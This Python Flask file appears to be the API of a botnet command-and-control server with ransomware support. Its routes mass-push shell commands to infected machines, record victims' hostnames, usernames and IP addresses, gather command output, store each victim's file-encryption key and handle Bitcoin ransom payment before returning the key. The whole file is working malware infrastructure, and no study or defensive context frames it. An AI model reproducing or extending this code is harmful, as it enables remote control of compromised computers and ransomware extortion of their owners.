from flask import Blueprint, request, abort, current_app, url_for, send_file, render_template, flash, redirect, escape
from datetime import datetime
from models import Bot
from models import Command
from models import db
import cgi

api = Blueprint('api', __name__)

@api.route('/mass_exec', methods=['POST'])
def mass_exec():
	selection = request.form.getlist('selection')
	if 'exec' in request.form:
		for bot_id in selection:
			Bot.query.get(bot_id).push_command(request.form['cmd'])
	return redirect(url_for('ui.bot_list'))

@api.route('/<bot_id>/push')
def push(bot_id):
	bot = Bot.query.get(bot_id)
	if not bot:
		abort(404)
	bot.push_command(request.form['cmd'])
	return ''	


#API call to check status of a bot
@api.route('/<bot_id>/status', methods=['POST'])
def get_status(bot_id):
	bot = Bot.query.get(bot_id)			#set bot equal to var
	if not bot:							#if doesnt exist then create new bot obj and add to db (new bot)
		bot = Bot(bot_id)				
	info = request.get_json()					#api call by post with json obj, update the db with the json obj
	print(info);
	if info:							#updates bot info each time 
		if 'platform' in info:
			bot.os = info['platform']
		if 'hostname' in info:
			bot.hostname = info['hostname']
		if 'username' in info:
			bot.username = info['username']
	bot.ip = request.remote_addr		#update ip address and last ping to now
	bot.last_ping = datetime.now()
	db.session.add(bot)
	db.session.commit()
	pending_cmd = ''					#check if the bot has any commands pending, if so then delete it and return it
	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
	if cmd:
		pending_cmd = cmd.cmd
		db.session.delete(cmd)
		db.session.commit()
	return pending_cmd

#Recieve output from the bot after running command
@api.route('/<bot_id>/report', methods=['POST'])
def get_report(bot_id):
	bot = Bot.query.get(bot_id)
	if not bot:
		abort(404)
	out = request.form['output']			
	print(out)
	bot.output = cgi.escape(out)
	db.session.add(bot)
	db.session.commit()
	return ''
#after running ransomware command
#endpoint recieves the key to which the file directory is encrypted
@api.route('/<bot_id>/lock', methods=['POST'])
def get_key(bot_id):
	bot = Bot.query.get(bot_id)
	if not bot:
		abort(404)
	key = request.form['key']
	print(key)
	bot.ransom_key = key
	db.session.add(bot)
	db.session.commit()
	return ''

#if the bot has paid(need to implement a table for incoming btc transactions)
# then return the key 
@api.route('/<bot_id>/pay', methods=['POST'])
def get_btc_addr(bot_id):
	bot = Bot.query.get(bot_id)
	if not bot:
		abort(404)
	key = request.form['btc_addr']
	bot.btc_addr = key
	bot.paid = False
	db.session.add(bot)
	db.session.commit()
	if bot.paid:
		return bot.ransom_key
	else:
		return ''

